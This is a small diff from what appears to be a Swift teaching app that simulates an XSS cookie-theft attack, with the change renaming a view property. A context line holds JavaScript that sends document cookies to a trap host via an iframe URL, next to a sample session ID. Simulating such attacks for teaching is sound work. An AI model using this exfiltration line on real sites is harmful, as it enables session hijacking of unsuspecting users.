@@ -45,7 +45,7 @@ iframe.setAttribute("src", "http://www.trap.co.jp/send_mail.php?cookie=" + docum
         attackedLabel.set(text: "攻撃成功")
         sessIdLabel.set(text: "PHPSESSID=c4ad79dc6067469927e00e1adc847c78")
         sessIdLabel.set(code: "echo $cookie;", language: .php)
-        feedbackIFrame.webSimulatorView = feedbackView
+        feedbackIFrame.webElementContainerView = feedbackView
     }
     
     private func showTrap() {
